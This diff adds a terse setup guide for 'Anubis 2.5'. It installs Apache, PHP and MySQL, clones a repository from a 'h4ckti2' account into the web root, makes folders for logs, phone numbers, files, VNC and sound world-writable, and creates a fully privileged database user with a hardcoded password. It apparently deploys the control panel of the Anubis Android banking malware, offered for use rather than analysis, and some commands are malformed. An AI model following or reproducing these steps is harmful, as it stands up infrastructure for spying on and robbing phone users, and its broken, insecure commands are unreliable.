@@ -1,0 +1,43 @@
+Anubis 2.5
+_______
+su
+cd ~
+_______
+package;
+apt install sudo
+apt install nano
+apt install wget
+apt install mv
+apt install git
+apt install ufw
+_________________
+Install Apache2 - php -mysql
+sudo apt install apache2
+sudo apt-get install software-properties-common
+apt-get install -y mysql-server
+sudo add-apt-repository ppa:ondrej/php
+sudo apt-get update
+sudo apt-get install -y php7.3 php7.3-mbstring php7.3-mysqli
+service apache2 restart
+_____________________________________________
+setup anubis
+cd ~
+git clone https://github.com/h4ckti2/anubis2.5
+mv anubis2.5 site
+mv site /var/www/html
+cd /var/www/html/site
+chmod 777anubis/application/datalogs/logs
+chmod 777anubis/application/datalogs/numers
+chmod 777anubis/application/datalogs/files
+chmod 777anubis/application/websocket/VNC
+chmod 777anubis/application/websocket/sound
+mysql -u root -p
+password; root
+CREATE USER 'anubis'@'127.0.0.1' IDENTIFIED BY '@###$dd32234422';
+GRANT ALL PRIVILEGES ON * . * TO 'anubis'@'127.0.0.1';
+FLUSH PRIVILEGES;
+create database anubisdb;
+FLUSH PRIVILEGES;
+ctrl + D
+mysql -u anubis -p anubisdb < admin_db.sql
+password; @###$dd32234422
